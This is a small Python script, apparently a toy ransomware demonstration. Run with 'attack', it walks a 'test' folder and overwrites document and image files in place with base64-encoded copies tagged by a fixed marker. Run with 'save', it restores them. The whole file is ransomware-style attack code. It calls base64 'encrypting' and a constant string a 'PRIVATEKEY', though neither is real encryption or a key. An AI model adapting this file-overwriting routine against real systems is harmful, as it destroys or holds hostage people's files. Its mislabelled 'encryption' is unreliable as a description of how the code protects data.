#coding: utf
import base64
import os, sys
import traceback
import time

def encrypting(list_files):
    PRIVATEKEY = base64.b64encode(b'Coders rule the world')
    for file in list_files:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            if content[-28:] == PRIVATEKEY:  #不重复加密
                pass
            else:
                with open(file, 'wb') as f:
                    f.write(base64.b64encode(content))
                    f.write(PRIVATEKEY)
        except:
            traceback.print_exc()
    
def decrypting(list_files):
    PRIVATEKEY = base64.b64encode(b'Coders rule the world')
    for file in list_files:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            if content[-28:] == PRIVATEKEY: # 不重复解密
                with open(file, 'wb') as f:    
                    content = content[0:-28]
                    f.write(base64.b64decode(content))
            else:
                pass
        except:
            traceback.print_exc()

# 在目标文件夹中遍历目标文件
def iterateFiles(directory):
    if not os.path.isdir(directory):
        return []
    suffix_list = ['doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'pdf', 'jpg', 'png']
    result = []
    for root, dirs, files in os.walk(directory, topdown = True):
        for file in files:
            for one in suffix_list:
                if one in file.split('.')[-1]:
                    result.append(os.path.join(root, file))
                    break
    return result

def attack():
    encrypting(iterateFiles("test"))

def save():
    decrypting(iterateFiles("test"))
        
if __name__ == '__main__':
    start = time.time()
    if (sys.argv[-1] == 'attack'):
        attack()
    elif (sys.argv[-1] == 'save'):
        save()
    else:
        print("Wrong input!")
    end = time.time()
    print('It took {} seconds'.format(end - start))
    
    
    